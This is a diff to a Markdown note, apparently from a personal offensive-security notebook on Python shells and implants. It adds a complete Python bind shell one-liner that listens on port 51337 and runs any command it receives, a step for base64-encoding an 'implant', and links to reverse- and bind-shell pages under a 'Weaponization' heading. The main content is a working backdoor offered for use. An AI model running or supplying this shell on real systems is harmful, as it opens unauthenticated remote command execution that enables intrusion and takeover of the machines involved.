@@ -1,6 +1,18 @@
 # Python
 
-## Base64 encoded one-line from CLI
+## 01 - Bind Shell
+
+```
+> python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+```
+
+## 02 - Base64 encoded one-line from CLI
+
+Encode the python implant.
+
+```
+$ basenc -w 0 implant.py
+```
 
 Single quote
 
@@ -44,6 +56,18 @@ EOF
 
 ---
 ## References
+
+### Reverse Shells
+
+- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xA - Callback Shells/One-Liners/Windows/Reverse Shells/Python|One-Liners: Windows Python Reverse Shells]]
+
+- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xA - Callback Shells/One-Liners/Linux/Reverse Shells/Python|One-Liners: Linux Python Reverse Shells]]
+
+### Bind Shells
+
+- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xA - Callback Shells/One-Liners/Linux/Bind Shells/Python|One-Liners: Linux Python Bind Shells]]
+
+### Resources
 
 - [don't code me on that: Python Reverse Shells](https://medium.com/dont-code-me-on-that/bunch-of-shells-python-b3fb1400b823)
 
